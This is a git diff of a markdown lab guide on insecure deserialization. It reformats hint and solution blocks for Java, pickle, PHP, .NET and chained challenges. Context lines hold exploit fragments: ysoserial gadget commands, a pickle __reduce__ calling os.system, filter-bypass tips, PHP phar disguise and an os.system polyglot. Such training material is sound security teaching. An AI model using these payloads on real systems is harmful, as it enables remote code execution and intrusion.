@@ -119,9 +119,7 @@ Major deserialization attacks:
 **Setup**: Java application accepting serialized input  
 **Goal**: Achieve RCE using Commons Collections gadget
 
-<details>
-<summary>💡 Hint 1: Identify serialization</summary>
-
+:::hint 💡 Hint 1: Identify serialization
 Look for:
 - Base64 that starts with `rO0AB`
 - Hex starting with `AC ED 00 05`
@@ -129,11 +127,9 @@ Look for:
 
 Decode and check for Java class names.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Generate payload</summary>
-
+:::hint 💡 Hint 2: Generate payload
 ysoserial is your friend:
 ```bash
 java -jar ysoserial.jar CommonsCollections5 "command" | base64
@@ -141,22 +137,18 @@ java -jar ysoserial.jar CommonsCollections5 "command" | base64
 
 But which gadget works? Try them all!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Deliver the payload</summary>
-
+:::hint 💡 Hint 3: Deliver the payload
 Common delivery methods:
 - Replace cookie value
 - POST body
 - Custom headers
 - WebSocket messages
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Detect serialization point
 ```python
 import base64
@@ -209,7 +201,7 @@ public class CustomGadget implements Serializable {
 }
 ```
 
-</details>
+:::
 
 ---
 
@@ -218,9 +210,7 @@ public class CustomGadget implements Serializable {
 **Setup**: Python app using pickle for session storage  
 **Goal**: Execute arbitrary Python code
 
-<details>
-<summary>💡 Hint 1: Understand pickle opcodes</summary>
-
+:::hint 💡 Hint 1: Understand pickle opcodes
 Pickle uses a stack-based VM. Key opcodes:
 - `c`: Import module
 - `(`: Mark object
@@ -229,32 +219,26 @@ Pickle uses a stack-based VM. Key opcodes:
 
 Can you craft these manually?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Use __reduce__</summary>
-
+:::hint 💡 Hint 2: Use __reduce__
 The `__reduce__` method controls pickling:
 ```python
 def __reduce__(self):
     return (os.system, ('command',))
 ```
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Bypass restrictions</summary>
-
+:::hint 💡 Hint 3: Bypass restrictions
 If certain modules are blocked:
 - Use builtins: `__builtins__`
 - Import indirectly: `__import__`
 - Use eval/exec
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Method 1: Basic pickle exploit**
 ```python
 import pickle
@@ -338,7 +322,7 @@ data = {
 requests.post(url, data=data)
 ```
 
-</details>
+:::
 
 ---
 
@@ -347,9 +331,7 @@ requests.post(url, data=data)
 **Setup**: PHP application with `unserialize()` on user input  
 **Goal**: Exploit magic methods for RCE
 
-<details>
-<summary>💡 Hint 1: Find the entry point</summary>
-
+:::hint 💡 Hint 1: Find the entry point
 Look for:
 - `unserialize($_COOKIE[...])`
 - `unserialize(base64_decode(...))`
@@ -357,11 +339,9 @@ Look for:
 
 PHP format: `O:4:"User":1:{s:4:"name";s:5:"admin";}`
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Identify useful classes</summary>
-
+:::hint 💡 Hint 2: Identify useful classes
 You need classes with exploitable magic methods:
 - `__wakeup()`: Called on unserialize
 - `__destruct()`: Called when object is destroyed
@@ -369,21 +349,17 @@ You need classes with exploitable magic methods:
 
 Find the application's classes!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Build gadget chain</summary>
-
+:::hint 💡 Hint 3: Build gadget chain
 Chain methods together:
 1. Entry point triggers `__wakeup()`
 2. Which calls vulnerable method
 3. Leading to file write/command execution
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Identify vulnerable code
 ```php
 // Vulnerable class example
@@ -472,7 +448,7 @@ rename("exploit.phar", "exploit.jpg");
 // file_exists("phar://./uploads/exploit.jpg/test.txt")
 ```
 
-</details>
+:::
 
 ---
 
@@ -481,38 +457,30 @@ rename("exploit.phar", "exploit.jpg");
 **Setup**: .NET application using BinaryFormatter  
 **Goal**: Exploit TypeConfuseDelegate gadget
 
-<details>
-<summary>💡 Hint 1: Identify .NET serialization</summary>
-
+:::hint 💡 Hint 1: Identify .NET serialization
 Look for:
 - Base64 with "AAEAAAD/////" prefix
 - ViewState parameters
 - .NET remoting endpoints
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Use ysoserial.net</summary>
-
+:::hint 💡 Hint 2: Use ysoserial.net
 Similar to Java version:
 ```
 ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"
 ```
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: ViewState exploitation</summary>
-
+:::hint 💡 Hint 3: ViewState exploitation
 If ViewState is used:
 - Need MachineKey or signing disabled
 - Use `-g ViewState` in ysoserial.net
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Method 1: Basic BinaryFormatter**
 ```csharp
 // Vulnerable code
@@ -564,7 +532,7 @@ public class CustomGadget : ISerializable {
 }
 ```
 
-</details>
+:::
 
 ---
 
@@ -572,30 +540,24 @@ public class CustomGadget : ISerializable {
 
 **Goal**: Chain multiple deserialization vulnerabilities
 
-<details>
-<summary>🎯 Challenge Overview</summary>
-
+:::hint 🎯 Hint 1
 Real-world scenarios often require:
 1. Bypass WAF/filters
 2. Escape sandboxes
 3. Work with limited gadgets
 4. Achieve persistence
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint: Polyglot payloads</summary>
-
+:::hint 💡 Hint 2
 Create payloads that work in multiple contexts:
 - Valid in multiple serialization formats
 - Bypass different filters
 - Work across languages
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 3
 **Stage 1: Initial foothold via filtered Java deserialization**
 ```java
 // WAF blocks Runtime.exec, use reflection
@@ -674,7 +636,7 @@ __import__('os').system('id')
 # - Both execute in their respective contexts
 ```
 
-</details>
+:::
 
 ---
 
